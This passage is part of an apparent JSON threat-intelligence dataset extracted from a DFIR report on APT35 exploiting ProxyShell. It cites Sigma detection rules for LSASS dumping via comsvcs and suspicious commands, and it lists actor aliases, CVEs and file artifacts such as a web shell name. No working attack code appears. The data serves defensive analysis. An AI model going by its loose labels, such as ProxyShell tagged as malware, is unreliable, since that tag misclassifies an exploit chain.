+      "text": "ump via Comsvcs DLL – https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/ rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml Net.exe Executi",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_170",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb170"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_171",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb171"
+      },
+      "text": "Suspicious Commands – https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/ rules/windows/process_creation/win_multiple_suspicious_cli.yml Rare Scheduled",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_title",
+      "page": 0,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_malware_ProxyShell"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_4",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_threatactor_TA453",
+        "ent_threatactor_Charming_Kitten",
+        "ent_threatactor_COBALT_ILLUSION",
+        "ent_threatactor_ITG18",
+        "ent_threatactor_Newscaster",
+        "ent_threatactor_Phosphorus"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_140",
+      "page": 21,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_malware_ProxyShell",
+        "ent_file_task_update.exe",
+        "ent_file_user.exe"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_122",
+      "page": 19,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_malware_ProxyShell",
+        "ent_file_user.exe"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_129",
+      "page": 19,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_malware_ProxyShell",
+        "ent_file_task_update.exe"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_135",
+      "page": 20,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT35",
+        "ent_malware_ProxyShell",
+        "ent_file_App_Web_vjloy3pa.dll"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_7",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_ProxyShell",
+        "ent_file_dllhost.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_66",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_ProxyShell",
+        "ent_file_dllhost.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_62",
+      "page": 14,
+      "candidate_entity_ids": [
+        "ent_file_aspx_dyukbdcxjfi.aspx",
+        "ent_file_dllhost.exe",
+        "ent_file_task_update.exe",
+        "ent_file_user.exe",
+        "ent_file_Wininet.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_49",
+      "page": 12,
+      "candidate_entity_ids": [
+        "ent_file_ipconfig.exe",
+        "ent_file_net.exe",
+        "ent_file_powershell.exe",
+        "ent_file_quser.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_86",
+      "page": 11,
+      "candidate_entity_ids": [
+        "ent_file_comsvcs.dll",
+        "ent_file_powershell.exe",
+        "ent_file_rundll32.exe",
+        "ent_file_ssasl.zip"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_68",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_cve_CVE-2021-31207",
+        "ent_cve_CVE-2021-34473",
+        "ent_cve_CVE-2021-34523"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_31",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_file_dllhost.exe",
+        "ent_file_Wininet.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_73",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_file_dllhost.exe",
+        "ent_file_powershell.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_74",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_file_dllhost.exe",
+        "ent_file_Wininet.bat"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_118",
+      "page": 15,
+      "candidate_entity_ids": [
+        "ent_url_https_github.com_SigmaHQ_sigma_blob_777d218adc789b7f1b146701793e78799324d87d_",
+        "ent_file_net.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_169",
+      "page": 15,
+      "candidate_entity_ids": [
+        "ent_url_https_github.com_SigmaHQ_sigma_blob_b81839e3ce507df925d6e583e569e1ac3a3894ab_",
+        "ent_file_net.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_30",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_file_Wininet.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
